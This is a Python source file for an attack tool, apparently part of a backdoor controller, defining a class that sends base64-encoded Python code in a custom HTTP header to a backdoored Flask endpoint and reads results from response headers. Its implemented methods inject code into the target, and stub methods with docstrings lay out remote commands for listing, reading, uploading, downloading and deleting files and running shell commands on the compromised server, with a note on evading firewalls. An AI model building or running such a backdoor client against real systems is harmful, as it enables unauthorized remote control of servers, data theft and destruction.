from pathlib import Path  # get filename
import base64  # encode commands
import requests  # HTTP requests
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The FlaskExploitProcessor class is an class that accepts commands
        passed into it and processes it to be sent to the backdoored Flask
        endpoint.
        Inherits from the ExploitProcessor class. 
"""
class FlaskExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        self.flask_object = 'Flask'
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        res = self._Base__send_message(f"global r;r={self.flask_object}.make_response({self.flask_object},'');"
                                       f"r.headers['{self.header}']='1|1';")
        print("Python Version: " + res.split('|')[0] +
              ", Flask Version: " + res.split('|')[1])
        
    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(f"global r;r={self.flask_object}.make_response({self.flask_object},'');"
                                            f"r.headers['{self.header}']='1|1';")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
        
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": base64.b64encode(message.encode()).decode() }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Message was not successfully processed.")
        
    """
    @brief Abstract method to print the current working directory.
    @param options Not used.
    @throw CommandException if the server doesn't respond with success.
    """
    def _Base__pwd(self, options: str):
        pass

    """
    @brief Abstract method to print the directories and files in the current
            working directory.
    @param options Not used.
    @throw CommandException if the server doesn't respond with success.
    """
    def _Base__ls(self, options: str):
        pass

    """
    @brief Abstract method to run a command on the target machine and print its
            output. If you run a command that needs an interactive shell,
            there's a good chance that it will cause the connection to hang,
            which could cause denial-of-service, so be careful.
    @param options the command to be run on the server.
    @throw CommandException if the server doesn't respond with success.
    """
    def _Base__run(self, options: str):
        pass

    """
    @brief Abstract method to change working directory.
    @param options the directory to change to.
    """
    def _Base__cd(self, options: str):
        pass

    """
    @brief Abstract method to print the contents of a file.
    @param options the file to print.
    """
    def _Base__cat(self, options: str):
        pass

    """
    @brief Abstract method to download a file from the server.
    @param options the file to download.
    """
    def _Base__download(self, options: str):
        pass

    """
    @brief Abstract method to upload a file to the server.
    @param options the file to upload.
    """
    def _Base__upload(self, options: str):
        pass

    """
    @brief Abstract method to delete a file or directory on the server.
    @param the file or directory to delete.
    """
    def _Base__rm(self, options: str):
        pass

    """
    @brief Abstract method to recursively create a directory.
    @param the directory name.
    """
    def _Base__mkdir(self, options: str):
        pass
